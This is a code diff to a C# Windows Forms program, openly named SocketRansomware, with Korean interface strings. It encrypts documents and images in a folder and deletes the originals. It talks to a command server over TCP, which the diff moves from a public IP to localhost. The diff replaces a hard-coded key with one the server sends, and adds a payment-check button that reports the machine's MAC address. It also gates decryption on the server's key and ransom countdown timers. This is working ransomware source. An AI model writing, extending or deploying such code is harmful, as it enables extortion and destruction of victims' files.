@@ -17,7 +17,8 @@ namespace SocketRansomware
 {
     public partial class Form1 : Form
     {
-        readonly string[] extensions = { ".docx", ".hwp", ".jpg", ".png", ".txt", ".jpeg" };
+        readonly string[] extensions = { ".docx", ".hwp", ".jpg", ".png", ".txt", ".jpeg", ".pdf" };
+        private string key;
         private const string PATH = @"C:\files";
         TcpClient client;
         Thread receiveMessageThread = null;
@@ -43,7 +44,7 @@ namespace SocketRansomware
             try
             {
                 client = new TcpClient(); //연결
-                client.Connect("182.218.194.156", 8080); //설정
+                client.Connect("localhost", 8080); //설정
                 receiveMessageThread = new Thread(ReceiveMessage);
                 receiveMessageThread.IsBackground = true;
                 receiveMessageThread.Start();
@@ -76,11 +77,11 @@ namespace SocketRansomware
             }
             catch (SocketException se)
             {
-                MessageBox.Show("실패");
+                MessageBox.Show("소켓 오류" + se.Message);
             }
             catch (Exception ee)
             {
-                MessageBox.Show("실패");
+                MessageBox.Show("실패 :" + ee.Message);
             }
         }
 
@@ -122,10 +123,11 @@ namespace SocketRansomware
                     {
                         this.infectionTime = Convert.ToDateTime(request[2]);
                         this.ts = Convert.ToDateTime(request[4]).Subtract(DateTime.Now);
-
-                      
-                      
                         timer1.Start();
+                    } else if(type.Equals("key"))
+                    {
+                        btnDecrypt.Enabled = true;
+                        key = request[1];
                     }
                     Console.WriteLine(str);
                 }
@@ -155,7 +157,7 @@ namespace SocketRansomware
                         using (FileStream fs = outputFile.Create())
                         {
                             Byte[] txt = File.ReadAllBytes(FullFileName);
-                            Byte[] newText = Crypto.Encrypt(txt, "bestinubestinu");
+                            Byte[] newText = Crypto.Encrypt(txt, key);
                             fs.Write(newText, 0, newText.Length);
                             File.Delete(FullFileName);
 
@@ -169,6 +171,8 @@ namespace SocketRansomware
 
         private void DecryptFiles(string key)
         {
+            if (this.key == null) return;
+
             System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(PATH);
             foreach (System.IO.FileInfo Fileinfo in di.GetFiles())
             {
@@ -182,7 +186,7 @@ namespace SocketRansomware
                     using (FileStream fs = outputFile.Create())
                     {
                         Byte[] text = File.ReadAllBytes(FullFileName);
-                        Byte[] newText = Crypto.Decrypt(text, "bestinubestinu");
+                        Byte[] newText = Crypto.Decrypt(text, key);
                         fs.Write(newText, 0, newText.Length);
                         File.Delete(FullFileName);
                     }
@@ -214,6 +218,7 @@ namespace SocketRansomware
             else
             {
                 lbtimer1.Text = duration.Hours.ToString("D2") + ":" + duration.Minutes.ToString("D2") + ":" + duration.Seconds.ToString("D2");
+                btnCheckPayment.Enabled = true;
             }
 
             if (duration2.TotalSeconds <= 0)
@@ -227,6 +232,7 @@ namespace SocketRansomware
             else
             {
                 lbtimer2.Text = duration2.Hours.ToString("D2") + ":" + duration.Minutes.ToString("D2") + ":" + duration.Seconds.ToString("D2");
+                btnCheckPayment.Enabled = true;
             }
         }
 
@@ -274,12 +280,13 @@ namespace SocketRansomware
 
         private void btnCheckPayment_Click(object sender, EventArgs e)
         {
-
+            string decrpyt = "decrypt;" + NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
+            SendDataServer(decrpyt);
         }
 
         private void btnDecrypt_Click(object sender, EventArgs e)
         {
-            DecryptFiles("OA/gXL/pLOWde6Fvxvm2TpColTuzeK4lnebwmX/Ci1E=");
+            DecryptFiles(this.key);
         }
 
         private void cbboxLanguage_SelectedIndexChanged(object sender, EventArgs e)
